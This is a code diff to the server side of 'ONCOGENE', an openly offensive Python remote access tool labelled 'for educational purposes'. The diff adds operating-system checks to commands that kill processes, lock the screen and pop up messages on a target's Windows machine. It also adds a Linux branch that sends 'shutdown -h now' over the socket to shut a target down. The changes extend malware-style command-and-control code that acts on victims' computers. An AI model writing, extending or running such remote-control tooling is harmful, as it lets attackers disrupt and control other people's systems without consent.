@@ -4,7 +4,7 @@
 |                               ONCOGENE                                |
 |    Author: f0lg0                                                      |
 |    Version: 0.5.0                                                     |
-|    Last update: 11-04-20 (dd-mm-yyy)                                  |
+|    Last update: 12-04-20 (dd-mm-yyy)                                  |
 |                                                                       |
 |                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
 +-----------------------------------------------------------------------+
@@ -195,19 +195,34 @@ class Server:
 
             elif i == '--kill':
                 try:
-                    self.killProcessWin()
+                    if self.info == "win32": # works only for Windows machines
+                        self.killProcessWin()
+                    elif self.info == "":
+                        print("[!] Get target info!")
+                    else:
+                        print("[!] Not a Windows machine")
                 except ConnectionResetError:
                     self.closeConnection()
 
             elif i == '--msg':
                 try:
-                    self.sendOsMessage()
+                    if self.info == "win32":
+                        self.sendOsMessage()
+                    elif self.info == "":
+                        print("[!] Get target info!")
+                    else:
+                        print("[!] Not a Windows machine")
                 except ConnectionResetError:
                     self.closeConnection()
 
             elif i == '--lock':
                 try:
-                    self.lockWindows()
+                    if self.info == "win32":
+                        self.lockWindows()
+                    elif self.info == "":
+                        print("[!] Get target info!")
+                    else:
+                        print("[!] Not a Windows machine")
                 except ConnectionResetError:
                     self.closeConnection()
 
@@ -285,11 +300,21 @@ class Server:
     def shutdownTarget(self):
         command = ""
 
-        command = "shutdown /s"
-        self.client_socket.send(command.encode("utf-8"))
+        if self.info == "win32":
+            command = "shutdown /s"
+            self.client_socket.send(command.encode("utf-8"))
 
-        self.client_socket.close()
-        print(f"[!] {self.address[0]} has been shut off")
+            self.client_socket.close()
+            print(f"[!] {self.address[0]} has been shut off")
+        elif self.info == "linux":
+            command = "shutdown -h now"
+            self.client_socket.send(command.encode("utf-8"))
+
+            self.client_socket.close()
+            print(f"[!] {self.address[0]} has been shut off")
+        else:
+            print("[!] Shutdown command not known.")
+            print("*** Try to get more informations on the target ***")
 
     def disconnectTarget(self):
         command = "--esc"
